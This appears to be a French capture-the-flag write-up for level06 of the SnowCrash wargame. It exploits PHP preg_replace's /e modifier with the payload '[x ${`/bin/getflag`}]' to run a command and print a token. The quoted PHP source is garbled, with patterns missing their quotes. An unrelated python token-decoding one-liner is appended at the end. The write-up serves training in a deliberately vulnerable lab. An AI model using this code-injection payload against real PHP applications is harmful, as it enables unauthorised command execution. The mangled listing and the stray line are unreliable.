# level06

1) Information trouvée dans `/home/level06/` :

```bash
level06  level06.php
level06@SnowCrash:~$ strings level06 | grep level06
/home/user/level06/level06.php
```

2) Analyse du fichier `level06.php`

Le binaire `level06` peut executer du code php via l'expand (option `e`) de `preg_replace`.

```php
function y($m) { $m = preg_replace(.,  x , $m); $m = preg_replace(@,  y, $m); return $m; }

function x($y, $z) { 
  $a = file_get_contents($y); 
  $a = preg_replace(([x (.*)])e, y(2), $a); 
  $a = preg_replace([, (, $a); 
  $a = preg_replace(], ), $a); 
  return $a; 
}
$r = x($argv[1], $argv[2]); print $r;

```
3) Exploitation pour récupérer le token :

* On crée une chaine pour `preg_replace` :```echo '[x ${`/bin/getflag`}]'```

On l'exécute :
```bash
level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' | ./level06 php://stdin 2>&1 | grep token
PHP Notice:  Undefined variable: Check flag.Here is your token : ...
```

4) Token découvert :

Le token est `wiok45aaoguiboiki2tuin6ub`.


python -c 'import sys; d=bytearray(open("token","rb").read()); sys.stdout.write("".join(chr((b-i)&0xff) for i,b in enumerate(d)))' > /tmp/tokendecyphered